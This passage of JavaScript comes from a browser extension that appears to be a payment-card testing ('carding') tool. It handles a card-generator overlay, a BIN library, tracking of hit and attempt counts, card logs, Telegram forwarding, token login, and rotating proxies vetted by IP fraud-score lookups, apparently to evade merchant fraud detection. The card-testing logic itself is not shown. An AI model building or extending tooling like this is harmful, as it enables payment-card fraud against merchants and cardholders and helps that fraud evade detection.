        throw new Error(ipResult && ipResult.error ? ipResult.error : "Failed to get current IP")
      }

      return {
        ip: ipResult.ip,
        viaProxy: false
      }
    }

    async function loadIpFraudModal() {
      setIpFraudLoading()
      try {
        const target = await resolveIpFraudTargetIp()
        const fraudResult = await sendToBackground({
          type: "GET_IP_FRAUD_CHECK",
          ip: target.ip,
          endpoint: ipFraudApiKey || ""
        })
        if (!fraudResult || !fraudResult.success) {
          throw new Error(fraudResult && fraudResult.error ? fraudResult.error : "Fraud check failed")
        }
        const hasDetails = [fraudResult.country, fraudResult.state, fraudResult.city, fraudResult.isp]
          .some((value) => value && value !== "N/A")
        if (!hasDetails) {
          throw new Error("Fraud lookup returned empty details")
        }
        if (target.viaProxy) {
          fraudResult.source = (fraudResult.source || "ipqualityscore") + " via active proxy"
        }
        renderIpFraudResult(fraudResult)
      } catch (e) {
        renderIpFraudError(e && e.message ? e.message : "Fraud check failed")
      }
    }

    function setupIpFraudHandlers() {
      const ipFraudBtn = document.getElementById("ipFraudBtn")
      const closeBtn = document.getElementById("closeIpFraudModal")
      const refreshBtn = document.getElementById("ipFraudRefreshBtn")
      const settingsBtn = document.getElementById("ipFraudSettingsBtn")
      const toggleBtn = document.getElementById("ipFraudToggleBtn")
      const modal = document.getElementById("ipFraudModal")
      const ipEl = document.getElementById("ipFraudIp")

      if (ipFraudBtn) {
        ipFraudBtn.addEventListener("click", async (e) => {
          e.preventDefault()
          e.stopPropagation()
          autoMinimizeForModal()
          if (modal) {
            modal.classList.remove("hidden")
            modal.classList.add("show")
          }
          await loadIpFraudModal()
        })
      }

      if (closeBtn) {
        closeBtn.addEventListener("click", () => {
          if (modal) {
            modal.classList.remove("show")
            modal.classList.add("hidden")
          }
          autoRestoreAfterModal()
        })
      }

      if (refreshBtn) {
        refreshBtn.addEventListener("click", () => {
          loadIpFraudModal()
        })
      }

      if (settingsBtn) {
        settingsBtn.addEventListener("click", () => {
          const next = window.prompt(
            "Enter your IPQualityScore API key. Leave blank to restore the built-in default key.",
            ipFraudApiKey || ""
          )
          if (next === null) return
          ipFraudApiKey = next.trim() || DEFAULT_IPQS_API_KEY
          localStorage.setItem(IP_FRAUD_API_KEY, ipFraudApiKey)
          loadIpFraudModal()
        })
      }

      if (toggleBtn && ipEl) {
        toggleBtn.addEventListener("click", () => {
          ipEl.classList.toggle("blurred")
          toggleBtn.title = ipEl.classList.contains("blurred") ? "Show IP" : "Hide IP"
        })
      }
    }

    function setupProxyModalListeners() {
      const closeBtn = document.getElementById("closeProxyModal")
      const saveBtn = document.getElementById("proxySaveBtn")
      const removeBtn = document.getElementById("proxyRemoveBtn")
      const checkAllBtn = document.getElementById("proxyCheckAllBtn")
      const removeOneBtns = document.querySelectorAll(".proxy-remove-one-btn")
      const checkOneBtns = document.querySelectorAll(".proxy-check-btn")

      if (closeBtn) {
        closeBtn.onclick = function () {
          const modal = document.getElementById("proxyModal")
          if (modal) {
            modal.classList.remove("show")
            modal.classList.add("hidden")
          }
          autoRestoreAfterModal()
        }
      }

      if (saveBtn) {
        saveBtn.onclick = async function () {
          const proxyInput = document.getElementById("proxyInput")
          const inputVal = proxyInput?.value?.trim() || ""

          if (!inputVal) {
            showWarning("Enter proxy", "error")
            return
          }
          const rotateToggle = document.getElementById("proxyAutoRotateToggle")
          const isAutoRotate = rotateToggle ? rotateToggle.checked : false

          const rawProxies = inputVal.split('\n').map((p) => p.trim()).filter((p) => p)
          if (rawProxies.length === 0) {
            showWarning("Enter at least one proxy", "error")
            return
          }

          const invalidProxies = rawProxies.filter((p) => !parseProxyFormat(p))
          const proxies = [...new Set(rawProxies.map((p) => normalizeProxyString(p)).filter((p) => !!p))]
          if (proxies.length === 0) {
            showWarning("Invalid proxy format. Use host:port, host:port:user:pass, or user:pass@host:port", "error")
            return
          }
          if (invalidProxies.length > 0) {
            showWarning(`Ignored ${invalidProxies.length} invalid proxy format${invalidProxies.length > 1 ? "s" : ""}`, "error")
          }

          saveBtn.disabled = true
          saveBtn.textContent = "Checking..."

          let liveProxies = []
          try {
            liveProxies = await checkMultipleProxies(proxies, (proxyStr, isLive) => {
              const shortStr = proxyStr.length > 15 ? proxyStr.substring(0, 15) + "..." : proxyStr
              saveBtn.textContent = isLive ? `OK ${shortStr}` : `Fail ${shortStr}`
            })
          } catch (err) {
            liveProxies = proxies.map((proxy) => ({
              string: proxy,
              info: { ip: "", response_time_ms: 0, country_name: "", country_code: "", ip_type: "" }
            }))
            saveBtn.textContent = "Trying..."
            showWarning("Connection error during check. Trying first valid proxy.", "info")
          }

          if (liveProxies.length === 0) {
            saveBtn.disabled = false
            saveBtn.textContent = "Save"
            showWarning("No usable proxy found", "error")
            return
          }

          proxyList = liveProxies
          proxyAutoRotate = isAutoRotate
          const activeProxy = liveProxies[0]

          proxyInfo = {
            ip: activeProxy.info.ip || "",
            response_time_ms: activeProxy.info.response_time_ms || 0,
            country_name: activeProxy.info.country_name || "",
            country_code: activeProxy.info.country_code || "",
            ip_type: activeProxy.info.ip_type || ""
          }

          saveBtn.textContent = "Applying..."

          let applyHandled = false
          const handleResult = (event) => {
            if (event.data && event.data.type === "PROXY_RESULT" && event.data.action === "apply") {
              applyHandled = true
              window.removeEventListener("message", handleResult)
              saveBtn.disabled = false
              saveBtn.textContent = "Save"

              if (event.data.success) {
                proxyString = activeProxy.string
                proxyEnabled = true
                saveProxySettings()
                updateProxyViewBtn()
                updateBottomIpBar(proxyInfo.ip, true)
                updateProxyModalContent()
                showWarning(`Saved ${proxyList.length} prox${proxyList.length > 1 ? "ies" : "y"}!`, "success")
              } else {
                showWarning("Failed to apply proxy: " + (event.data.error || "Unknown error"), "error")
              }
            }
          }
          window.addEventListener("message", handleResult)
          window.postMessage({ type: "APPLY_PROXY", proxy: activeProxy.string }, "*")

          setTimeout(() => {
            if (applyHandled) return
            window.removeEventListener("message", handleResult)
            saveBtn.disabled = false
            saveBtn.textContent = "Save"
            showWarning("Proxy apply timed out", "error")
          }, 12000)
        }
      }

      async function applyProxyWithResult(nextProxyString) {
        return await new Promise((resolve) => {
          let finished = false
          const handler = (event) => {
            if (event.data && event.data.type === "PROXY_RESULT" && event.data.action === "apply") {
              if (finished) return
              finished = true
              window.removeEventListener("message", handler)
              resolve(event.data)
            }
          }
          window.addEventListener("message", handler)
          window.postMessage({ type: "APPLY_PROXY", proxy: nextProxyString }, "*")
          setTimeout(() => {
            if (finished) return
            finished = true
            window.removeEventListener("message", handler)
            resolve({ success: false, error: "Proxy apply timed out" })
          }, 12000)
        })
      }

      async function removeSingleProxyAt(index) {
        if (!Array.isArray(proxyList) || proxyList.length === 0) return
        if (index < 0 || index >= proxyList.length) return

        const removed = proxyList[index]
        const removedWasCurrent = removed && removed.string === proxyString
        proxyList.splice(index, 1)

        if (proxyList.length === 0) {
          proxyString = ""
          proxyEnabled = false
          proxyAutoRotate = false
          proxyInfo = { ip: "", response_time_ms: 0, country_name: "", country_code: "", ip_type: "" }
          saveProxySettings()
          updateProxyViewBtn()
          window.postMessage({ type: "CLEAR_PROXY" }, "*")
          updateBottomIpBar("", false)
          fetchRealIp()
          updateProxyModalContent()
          showWarning("Removed last proxy", "info")
          return
        }

        if (removedWasCurrent) {
          const nextProxy = proxyList[0]
          proxyString = nextProxy.string
          proxyInfo = nextProxy.info || { ip: "", response_time_ms: 0, country_name: "", country_code: "", ip_type: "" }
          const applyResult = await applyProxyWithResult(proxyString)
          if (applyResult && applyResult.success) {
            proxyEnabled = true
            updateBottomIpBar(proxyInfo.ip || "", true)
          } else {
            proxyEnabled = false
            showWarning("Removed current proxy, failed to apply next: " + ((applyResult && applyResult.error) || "Unknown error"), "error")
          }
        }

        saveProxySettings()
        updateProxyViewBtn()
        updateProxyModalContent()
        showWarning("Proxy removed from list", "success")
      }

      async function checkFraudForProxyAt(index, triggerBtn) {
        if (!Array.isArray(proxyList) || index < 0 || index >= proxyList.length) return
        const rowStatus = document.getElementById("proxyFraudStatus-" + index)
        const entry = proxyList[index]
        if (!entry || !entry.string) return

        if (triggerBtn) {
          triggerBtn.disabled = true
          triggerBtn.textContent = "..."
        }
        if (rowStatus) {
          rowStatus.textContent = "Checking fraud..."
          rowStatus.className = "proxy-list-status checking"
        }

        try {
          const liveResult = await checkProxyLive(entry.string)
          if (!liveResult || !liveResult.success) {
            throw new Error((liveResult && liveResult.error) || "Proxy check failed")
          }

          const proxyIp = liveResult.proxy_ip || (entry.info && entry.info.ip) || ""
          if (!proxyIp) throw new Error("No IP from proxy check")

          entry.info = {
            ip: liveResult.proxy_ip || "",
            response_time_ms: liveResult.response_time_ms || 0,
            country_name: liveResult.country_name || "",
            country_code: liveResult.country_code || "",
            ip_type: liveResult.ip_type || ""
          }

          if (entry.string === proxyString) {
            proxyInfo = entry.info
            saveProxySettings()
            updateBottomIpBar(proxyInfo.ip || "", true)
          }

          const fraudResult = await sendToBackground({
            type: "GET_IP_FRAUD_CHECK",
            ip: proxyIp,
            endpoint: ipFraudApiKey || ""
          })

          if (!fraudResult || !fraudResult.success) {
            throw new Error((fraudResult && fraudResult.error) || "Fraud check failed")
          }

          const score = clampIpFraudScore(fraudResult.score)
          const riskClass = getIpFraudRiskClass(score)
          const riskLabel = getIpFraudRiskLabel(score)
          if (rowStatus) {
            rowStatus.textContent = `IP ${proxyIp} | Fraud ${riskLabel} (${score})`
            rowStatus.className = "proxy-list-status " + riskClass
          }
        } catch (e) {
          if (rowStatus) {
            rowStatus.textContent = (e && e.message) ? e.message : "Fraud check failed"
            rowStatus.className = "proxy-list-status error"
          }
        } finally {
          if (triggerBtn) {
            triggerBtn.disabled = false
            triggerBtn.textContent = "Check"
          }
        }
      }

      removeOneBtns.forEach((btn) => {
        btn.onclick = async function () {
          const index = parseInt(btn.getAttribute("data-proxy-index") || "-1", 10)
          btn.disabled = true
          btn.textContent = "..."
          try {
            await removeSingleProxyAt(index)
          } finally {
            if (document.body.contains(btn)) {
              btn.disabled = false
              btn.textContent = "Remove"
            }
          }
        }
      })

      checkOneBtns.forEach((btn) => {
        btn.onclick = async function () {
          const index = parseInt(btn.getAttribute("data-proxy-index") || "-1", 10)
          await checkFraudForProxyAt(index, btn)
        }
      })

      if (checkAllBtn) {
        checkAllBtn.onclick = async function () {
          if (!Array.isArray(proxyList) || proxyList.length === 0) return
          checkAllBtn.disabled = true
          checkAllBtn.textContent = "Checking..."
          let okCount = 0
          for (let i = 0; i < proxyList.length; i++) {
            await checkFraudForProxyAt(i, null)
            const rowStatus = document.getElementById("proxyFraudStatus-" + i)
            if (rowStatus && rowStatus.className.indexOf("error") === -1) okCount++
          }
          checkAllBtn.disabled = false
          checkAllBtn.textContent = "Check All Fraud"
          showWarning(`Fraud check done: ${okCount}/${proxyList.length}`, "info")
        }
      }

      if (removeBtn) {
        removeBtn.onclick = function () {
          removeBtn.disabled = true
          removeBtn.textContent = "..."
          window.postMessage({ type: "CLEAR_PROXY" }, "*")

          const handleResult = (event) => {
            if (event.data && event.data.type === "PROXY_RESULT" && event.data.action === "clear") {
              window.removeEventListener("message", handleResult)
              removeBtn.disabled = false
              removeBtn.textContent = "Remove"

              if (!event.data.success) {
                showWarning("Failed to clear proxy: " + (event.data.error || "Unknown error"), "error")
                return
              }

              proxyString = ""
              proxyEnabled = false
              proxyList = []
              proxyAutoRotate = false
              proxyInfo = { ip: "", response_time_ms: 0, country_name: "", country_code: "", ip_type: "" }
              saveProxySettings()
              updateProxyViewBtn()

              updateBottomIpBar("", false)
              fetchRealIp()

              const modal = document.getElementById("proxyModal")
              if (modal) {
                modal.classList.remove("show")
                modal.classList.add("hidden")
              }

              const overlay = document.querySelector(".card-generator-overlay")
              if (overlay && isMinimized) {
                isMinimized = false
                overlay.classList.remove("minimized")
                const minimizeBtn = document.getElementById("minimizeBtn")
                if (minimizeBtn) {
                  minimizeBtn.innerHTML = ">>"
                  minimizeBtn.title = "Close panel"
                }
              }

              showWarning("Proxy removed", "info")
            }
          }
          window.addEventListener("message", handleResult)

          setTimeout(() => {
            window.removeEventListener("message", handleResult)
            removeBtn.disabled = false
            removeBtn.textContent = "Remove"
          }, 5000)
        }
      }
    }

    function isValidHexColor(hex) {
      return /^#[0-9A-Fa-f]{6}$/.test(hex)
    }

    function updateBgColor(color) {
      if (!isValidHexColor(color)) return
      pageBackgroundColor = color
      hasCustomColor = true
      _bgProcessed = new WeakSet()
      _lastAppliedBgColor = null
      saveBgColorSetting(bgColorEnabled, color, true)
      const colorInput = document.getElementById("pageBgColorInput")
      if (colorInput) colorInput.value = color
      if (bgColorEnabled) {
        applyCustomStyles()
      }
    }

    function showBgInfoModal() {

      const overlay = document.querySelector(".card-generator-overlay")
      if (overlay && !isMinimized) {
        isMinimized = true
        overlay.classList.add("minimized")
        const minimizeBtn = document.getElementById("minimizeBtn")
        if (minimizeBtn) {
          minimizeBtn.innerHTML = "✦"
          minimizeBtn.title = "Open panel"
        }
      }

      const modal = document.getElementById("bgInfoModal")
      if (modal) {
        modal.classList.remove("hidden")
        modal.classList.add("show")
      }
    }

    function setupBgColorHandlers() {

      const bgColorToggle = document.getElementById("bgColorToggle")
      if (bgColorToggle) {
        bgColorToggle.addEventListener("change", function () {
          bgColorEnabled = this.checked
          _bgProcessed = new WeakSet()
          _lastAppliedBgColor = null
          saveBgColorSetting(bgColorEnabled, pageBackgroundColor, hasCustomColor)

          const colorSettingsBox = document.getElementById("colorSettingsBox")
          if (colorSettingsBox) {
            colorSettingsBox.classList.toggle("hidden", !bgColorEnabled)
          }
          if (bgColorEnabled) {

            showBgInfoModal()

            if (!hasCustomColor) {
              sessionRandomColor = getRandomBgColor();
            }
            applyCustomStyles()
          } else {

            document.documentElement.style.removeProperty('background')
            document.documentElement.style.removeProperty('background-color')
            document.body.style.removeProperty('background')
            document.body.style.removeProperty('background-color')
            location.reload()
          }
        })
      }

      const pageBgColorInput = document.getElementById("pageBgColorInput")
      if (pageBgColorInput) {
        pageBgColorInput.addEventListener("input", function () {
          updateBgColor(this.value)
        })
      }

      const customMusicBtn = document.getElementById("customMusicBtn")
      const musicFileInput = document.getElementById("musicFileInput")
      const customMusicInfo = document.getElementById("customMusicInfo")
      const musicFilename = document.getElementById("musicFilename")
      const removeMusicBtn = document.getElementById("removeMusicBtn")
      const previewMusicBtn = document.getElementById("previewMusicBtn")

      let previewAudio = null
      let isPreviewPlaying = false

      // One-time cleanup: remove old base64 audio data from localStorage (now in chrome.storage)
      try { localStorage.removeItem(K.MUSIC_DATA) } catch (e) { }

      const savedMusicName = localStorage.getItem(K.MUSIC_NAME)
      if (savedMusicName && customMusicInfo && musicFilename) {
        customMusicInfo.classList.remove("hidden")
        musicFilename.textContent = savedMusicName
        if (customMusicBtn) customMusicBtn.textContent = "Change"
      }

      if (previewMusicBtn) {
        previewMusicBtn.addEventListener("click", () => {
          if (!localStorage.getItem(K.MUSIC_NAME)) {
            showWarning("No custom music to preview", "info")
            return
          }
          if (isPreviewPlaying) {
            window.postMessage({ type: "STOP_CUSTOM_PREVIEW" }, "*")
            isPreviewPlaying = false
            previewMusicBtn.textContent = "▶️ Test"
            showWarning("Preview stopped", "info")
            return
          }
          window.postMessage({ type: "PLAY_CUSTOM_PREVIEW" }, "*")
          isPreviewPlaying = true
          previewMusicBtn.textContent = "\u23F9\uFE0F Stop"
          showWarning("Playing...", "success")

          setTimeout(() => {
            if (isPreviewPlaying) {
              isPreviewPlaying = false
              previewMusicBtn.textContent = "▶️ Test"
            }
          }, 30000)
        })
      }

      if (customMusicBtn && musicFileInput) {
        customMusicBtn.addEventListener("click", () => {
          if (previewAudio) {
            previewAudio.pause()
            previewAudio = null
            isPreviewPlaying = false
            if (previewMusicBtn) previewMusicBtn.textContent = "▶️"
          }
          musicFileInput.click()
        })

        musicFileInput.addEventListener("change", function () {
          const file = this.files[0]
          if (!file) return

          if (!file.type.includes("audio/mpeg") && !file.name.endsWith(".mp3")) {
            showWarning("Only MP3 files allowed", "error")
            return
          }

          if (file.size > 5 * 1024 * 1024) {
            showWarning("File too large (max 5MB)", "error")
            return
          }

          const reader = new FileReader()
          reader.onload = function (e) {
            const base64 = e.target.result
            // Only store name in localStorage (tiny); audio data goes to chrome.storage via content script
            localStorage.setItem(K.MUSIC_NAME, file.name)
            window.postMessage({ type: "SAVE_CUSTOM_MUSIC", audioData: base64 }, "*")

            if (customMusicInfo) customMusicInfo.classList.remove("hidden")
            if (musicFilename) musicFilename.textContent = file.name
            if (customMusicBtn) customMusicBtn.textContent = "Change"

            showWarning("Custom music uploaded!", "success")
          }
          reader.readAsDataURL(file)
        })
      }

      if (removeMusicBtn) {
        removeMusicBtn.addEventListener("click", () => {
          if (previewAudio) {
            previewAudio.pause()
            previewAudio = null
            isPreviewPlaying = false
            if (previewMusicBtn) previewMusicBtn.textContent = "▶️"
          }
          localStorage.removeItem(K.MUSIC_NAME)
          window.postMessage({ type: "REMOVE_CUSTOM_MUSIC" }, "*")
          if (customMusicInfo) customMusicInfo.classList.add("hidden")
          if (musicFilename) musicFilename.textContent = "No file"
          if (customMusicBtn) customMusicBtn.textContent = "Upload"
          showWarning("Custom music removed", "info")
        })
      }
    }

    function setupBinLibraryHandlers() {
      const binLibraryBtn = document.getElementById("binLibraryBtn")
      if (binLibraryBtn) {
        binLibraryBtn.addEventListener("click", async (e) => {
          e.preventDefault()
          e.stopPropagation()

          autoMinimizeForModal()

          const modal = document.getElementById("binLibraryModal")
          if (modal) {
            modal.classList.remove("hidden")
            modal.classList.add("show")
          }

          const grid = document.getElementById("binLibraryGrid")
          if (grid) {
            grid.innerHTML = '<div class="bin-library-empty">Loading BIN Library...</div>'
          }

          let success = await fetchBinLibrary()

          if (!success || binLibrary.length === 0) {
            await new Promise(r => setTimeout(r, 200))
            success = await fetchBinLibrary()
          }

          renderBinLibraryGrid()
        })
      }

      const closeBinLibraryModal = document.getElementById("closeBinLibraryModal")
      if (closeBinLibraryModal) {
        closeBinLibraryModal.addEventListener("click", () => {
          const modal = document.getElementById("binLibraryModal")
          if (modal) {
            modal.classList.remove("show")
            modal.classList.add("hidden")
          }

          autoRestoreAfterModal()
        })
      }
    }

    function setupMusicAndHistoryHandlers() {
      const musicToggleBtn = document.getElementById("musicToggleBtn")
      if (musicToggleBtn) {
        musicToggleBtn.addEventListener("click", (e) => {
          e.preventDefault()
          e.stopPropagation()
          toggleMusic()
        })
      }
      const clearHistory = document.getElementById("clearHistory")
      if (clearHistory) {
        clearHistory.addEventListener("click", () => {
          cardHistory = []
          localStorage.removeItem(K.LOGS)
          const clearedAt = new Date().toISOString()
          localStorage.setItem(K.LOGS_CLEARED_AT, clearedAt)
          saveToGlobalStorage(K.LOGS, [])
          saveToGlobalStorage(K.LOGS_CLEARED_AT, clearedAt)
          updateHistoryDisplay()
          showWarning("✅ Logs cleared", "success")
        })
      }
    }

    const proxyViewBtn = document.getElementById("proxyViewBtn")
    if (proxyViewBtn) {
      proxyViewBtn.addEventListener("click", function (e) {
        e.preventDefault()
        e.stopPropagation()

        autoMinimizeForModal()

        const modal = document.getElementById("proxyModal")
        if (modal) {
          updateProxyModalContent()
          modal.classList.remove("hidden")
          modal.classList.add("show")
        }
      })
    }

    setupProxyModalListeners()
    setupIpFraudHandlers()

    setupBgColorHandlers()

    setupMusicAndHistoryHandlers()

    setupBinLibraryHandlers()

    const closeBgInfoModalBtn = document.getElementById("closeBgInfoModal")
    const bgInfoOkBtn = document.getElementById("bgInfoOkBtn")

    if (closeBgInfoModalBtn) {
      closeBgInfoModalBtn.addEventListener("click", function () {
        const modal = document.getElementById("bgInfoModal")
        if (modal) {
          modal.classList.remove("show")
          modal.classList.add("hidden")
        }

        autoRestoreAfterModal()
      })
    }
    if (bgInfoOkBtn) {
      bgInfoOkBtn.addEventListener("click", function () {
        const modal = document.getElementById("bgInfoModal")
        if (modal) {
          modal.classList.remove("show")
          modal.classList.add("hidden")
        }

        autoRestoreAfterModal()
      })
    }
  }

  function setupLoginListeners() {
    const loginBtn = document.getElementById("loginBtn")
    const tokenInput = document.getElementById("tokenInput")
    const logoutBtn = document.getElementById("logoutBtn")
    if (loginBtn) {
      loginBtn.addEventListener("click", handleLogin)
    }
    if (tokenInput) {
      tokenInput.addEventListener("keypress", (e) => {
        if (e.key === "Enter") handleLogin()
      })
    }
    if (logoutBtn) {
      logoutBtn.addEventListener("click", handleLogout)
    }
  }

  async function handleLogin() {
    const tokenInput = document.getElementById("tokenInput")
    const loginBtn = document.getElementById("loginBtn")
    if (!tokenInput) return
    const token = tokenInput.value.trim().toUpperCase()
    if (!token) {
      showLoginError("Enter your token")
      return
    }
    if (token.length !== 15) {
      showLoginError("Token must be 15 characters")
      return
    }
    loginBtn.disabled = true
    loginBtn.innerHTML = "⏳ Verifying..."
    try {
      const result = await validateToken(token)
      if (result.success) {
        userId = result.userId
        userFirstName = result.firstName || ""
        userPfpUrl = result.pfpUrl || DEFAULT_PFP
        userHitsCount = result.userHits ?? result.hits ?? 0
        globalHitsCount = result.globalHits ?? globalHitsCount
        userAttemptsCount = result.attempts || 0
        isLoggedIn = true
        updateIpBarUserInfo()
        startHitCountsRefresh()

        // Retry pfp load - bot may still be uploading to imgBB
        if (!userPfpUrl || userPfpUrl === DEFAULT_PFP) {
          const retryToken = token;
          const retryDelays = [3000, 6000, 12000];
          retryDelays.forEach(delay => {
            setTimeout(async () => {
              if (userPfpUrl && userPfpUrl !== DEFAULT_PFP) return;
              try {
                const fresh = await validateToken(retryToken);
                if (fresh.success && fresh.pfpUrl && fresh.pfpUrl !== DEFAULT_PFP) {
                  userPfpUrl = fresh.pfpUrl;
                  updateIpBarUserInfo();
                }
              } catch (e) { }
            }, delay);
          });
        }

        // Save to localStorage for backwards compatibility
        localStorage.setItem(K.TOKEN, token)
        localStorage.setItem(K.USER_ID, userId)
        localStorage.setItem(K.FIRST_NAME, userFirstName)
        savedId = userId

        // Save to synced chrome.storage via storage module
        if (window.kimtimStorage && window.kimtimStorage.saveUserSession) {
          window.kimtimStorage.saveUserSession(token, userId, userFirstName);
        }

        window.postMessage({
          type: "SAVE_LOGIN_STATE",
          token: token,
          userId: userId,
          firstName: userFirstName,
        }, "*")

        const loginScreen = document.getElementById("loginScreen")
        const dashboard = document.getElementById("mainDashboard")
        loginScreen?.classList.add("hidden")
        dashboard?.classList.remove("hidden")
        dashboard?.classList.add("dashboard-enter")

        const welcomeMsg = result.firstName ? `Welcome, ${result.firstName}!` : "Login successful!"
        showWarning(welcomeMsg, "success")
      } else {
        showLoginError(result.message || "Invalid token")
      }
    } catch (error) {
      showLoginError("Connection error")
    }
    loginBtn.disabled = false
    loginBtn.innerHTML = "🔑 LOGIN"
  }

  async function validateToken(token) {
    if (!token || token.length !== 15) {
      return { success: false, message: "Token must be 15 characters" }
    }
    const data = await sendToBackground({ type: "VALIDATE_TOKEN", token: token })
    if (data.success) {
      return {
        success: true,
        userId: String(data.user_id),
        username: data.username,
        firstName: data.first_name,
        pfpUrl: data.pfp_url || '',
        hits: data.hits,
        attempts: data.attempts,
        globalHits: data.global_hits,
        userHits: data.user_hits,
      }
    } else {
      return { success: false, message: data.error || "Invalid token" }
    }
  }

  async function validateSavedToken(token) {
    if (!token || token.length !== 15) {
      return false
    }
    try {
      const data = await sendToBackground({ type: "VALIDATE_TOKEN", token: token })
      return data.success === true
    } catch (e) {
      return true
    }
  }

  function showLoginError(message) {
    const loginError = document.getElementById("loginError")
    if (loginError) {
      loginError.textContent = message
      loginError.classList.remove("hidden")
      setTimeout(() => {
        loginError.classList.add("hidden")
      }, 3000)
    }
  }

  function handleLogout() {
    stopHitCountsRefresh();
    userId = ""
    userFirstName = ""
    userPfpUrl = DEFAULT_PFP
    userHitsCount = 0
    userAttemptsCount = 0
    globalHitsCount = 0
    isLoggedIn = false
    // Clear ALL user-related localStorage keys
    localStorage.removeItem(K.TOKEN)
    localStorage.removeItem(K.USER_ID)
    localStorage.removeItem(K.FIRST_NAME)
    // Clear chrome.storage session
    if (window.kimtimStorage && window.kimtimStorage.clearUserSession) {
      window.kimtimStorage.clearUserSession();
    }
    window.postMessage({ type: "SAVE_LOGIN_STATE", token: null }, "*")
    updateIpBarUserInfo()
    document.getElementById("loginScreen")?.classList.remove("hidden")
    document.getElementById("mainDashboard")?.classList.add("hidden")
    const tokenInput = document.getElementById("tokenInput")
    if (tokenInput) tokenInput.value = ""
    showWarning("Logged out", "info")
  }

  // ============= CROSS-TAB STORAGE SYNC LISTENER =============
  // This MUST be inside the IIFE so it has access to all variables and functions
  window.addEventListener('message', async (event) => {
    if (event.data && event.data.type === 'kimtim_STORAGE_CHANGED') {
      const changes = event.data.changes || {};

      // Sync login/logout state (null = key was removed = logout)
      if (K.TOKEN in changes) {
        if (changes[K.TOKEN] && changes[K.TOKEN] !== null) {
          // New token from another tab -- validate before applying
          const isValid = await validateSavedToken(changes[K.TOKEN]);
          if (isValid) {
            const token = changes[K.TOKEN];
            localStorage.setItem(K.TOKEN, token);
            if (changes[K.USER_ID]) {
              userId = changes[K.USER_ID];
              localStorage.setItem(K.USER_ID, userId);
              savedId = userId;
            }
            if (changes[K.FIRST_NAME]) {
              userFirstName = changes[K.FIRST_NAME];
              localStorage.setItem(K.FIRST_NAME, userFirstName);
            }
            isLoggedIn = true;

            // Fetch fresh user data (pfp, hits) for this tab
            try {
              const result = await validateToken(token);
              if (result.success) {
                userPfpUrl = result.pfpUrl || DEFAULT_PFP;
                userHitsCount = result.userHits ?? result.hits ?? 0;
                globalHitsCount = result.globalHits ?? globalHitsCount;
                userAttemptsCount = result.attempts || 0;
              }
            } catch (e) { }

            await Promise.race([fetchHitCounts(), new Promise(r => setTimeout(r, 2000))]);

            // Show dashboard, hide login screen
            const loginScreen = document.getElementById('loginScreen');
            const dashboard = document.getElementById('mainDashboard');
            if (loginScreen && dashboard && !loginScreen.classList.contains('hidden')) {
              loginScreen.classList.add('hidden');
              dashboard.classList.remove('hidden');
              showWarning('Logged in from another tab', 'success');
            }
            updateIpBarUserInfo();
            startHitCountsRefresh();
          }
        } else {
          // Logged out from another tab
          stopHitCountsRefresh();
          isLoggedIn = false;
          userId = '';
          userFirstName = '';
          userPfpUrl = DEFAULT_PFP;
          userHitsCount = 0;
          userAttemptsCount = 0;
          globalHitsCount = 0;
          localStorage.removeItem(K.TOKEN);
          localStorage.removeItem(K.USER_ID);
          localStorage.removeItem(K.FIRST_NAME);
          updateIpBarUserInfo();

          // Show login screen
          const loginScreen = document.getElementById('loginScreen');
          const dashboard = document.getElementById('mainDashboard');
          if (loginScreen && dashboard) {
            loginScreen.classList.remove('hidden');
            dashboard.classList.add('hidden');
          }
          const tokenInput = document.getElementById('tokenInput');
          if (tokenInput) tokenInput.value = '';
          showWarning('Logged out from another tab', 'info');
        }
      }

      // Sync BINs
      if (changes[K.SAVED_BINS] !== undefined && Array.isArray(changes[K.SAVED_BINS])) {
        savedBINs = changes[K.SAVED_BINS];
        currentBinIndex = 0;
        localStorage.setItem(K.SAVED_BINS, JSON.stringify(savedBINs));
        rebuildBinListUI();
      }

      // Sync custom name/email
      if (changes[K.CUSTOM_NAME] !== undefined) {
        customName = changes[K.CUSTOM_NAME];
        localStorage.setItem(K.CUSTOM_NAME, customName);
        const nameInput = document.getElementById('customNameInput');
        if (nameInput) nameInput.value = customName;
      }
      if (changes[K.CUSTOM_EMAIL] !== undefined) {
        customEmail = changes[K.CUSTOM_EMAIL];
        localStorage.setItem(K.CUSTOM_EMAIL, customEmail);
        const emailInput = document.getElementById('customEmailInput');
        if (emailInput) emailInput.value = customEmail;
      }

      // Sync toggle states
      if (changes[K.TOGGLE_TG_FORWARD] !== undefined) {
        tgForwardEnabled = changes[K.TOGGLE_TG_FORWARD] !== false;
        localStorage.setItem(K.TOGGLE_TG_FORWARD, tgForwardEnabled);
      }
      if (changes[K.TOGGLE_HIT_SOUND] !== undefined) {
        localStorage.setItem(K.TOGGLE_HIT_SOUND, changes[K.TOGGLE_HIT_SOUND]);
      }
      if (changes[K.TOGGLE_AUTO_SS] !== undefined) {
        localStorage.setItem(K.TOGGLE_AUTO_SS, changes[K.TOGGLE_AUTO_SS]);
      }

      // Sync saved ID
      if (changes[K.SAVED_ID] !== undefined) {
        savedId = changes[K.SAVED_ID];
        localStorage.setItem(K.SAVED_ID, savedId);
      }

      // Sync background/color settings
      if (changes[K.BG_COLOR] !== undefined) {
        pageBackgroundColor = changes[K.BG_COLOR];
        localStorage.setItem(K.BG_COLOR, changes[K.BG_COLOR]);
      }
      if (changes[K.HAS_CUSTOM_COLOR] !== undefined) {
        localStorage.setItem(K.HAS_CUSTOM_COLOR, changes[K.HAS_CUSTOM_COLOR]);
      }
      if (changes[K.BG_ENABLED] !== undefined) {
        localStorage.setItem(K.BG_ENABLED, changes[K.BG_ENABLED]);
      }
      if (changes[K.PAGE_BG_COLOR] !== undefined) {
        localStorage.setItem(K.PAGE_BG_COLOR, changes[K.PAGE_BG_COLOR]);
      }
      if (changes[K.PAGE_HAS_CUSTOM] !== undefined) {
        userHasSetCustomColor = changes[K.PAGE_HAS_CUSTOM] === true || changes[K.PAGE_HAS_CUSTOM] === 'true';
      }

      // Sync logs
      if (changes[K.LOGS] !== undefined) {
        let logs = changes[K.LOGS];
        if (typeof logs === 'string') try { logs = JSON.parse(logs); } catch (e) { logs = []; }
        if (Array.isArray(logs)) {
          cardHistory = logs;
          localStorage.setItem(K.LOGS, JSON.stringify(logs));
        }
      }
      if (changes[K.LOGS_CLEARED_AT] !== undefined) {
        localStorage.setItem(K.LOGS_CLEARED_AT, changes[K.LOGS_CLEARED_AT]);
      }

      // Sync proxy
      if (changes[K.PROXY_ENABLED] !== undefined) {
        localStorage.setItem(K.PROXY_ENABLED, changes[K.PROXY_ENABLED]);
      }
